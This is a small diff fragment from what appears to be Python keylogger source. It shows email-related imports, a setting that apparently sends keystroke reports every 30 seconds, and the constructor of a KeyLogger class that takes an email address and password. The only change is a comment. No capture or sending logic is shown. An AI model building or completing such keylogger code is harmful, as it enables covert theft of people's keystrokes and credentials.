@@ -16,7 +16,7 @@ from email.mime.text import MIMEText
 from smtplib import SMTPAuthenticationError
 import glob
 
-sendReportEvery = 30  # Unit = Seconds // Change if necessary
+sendReportEvery = 30  # Unit = Seconds // Change to liking
 
 class KeyLogger:
     def __init__(self, time_interval, email, password):
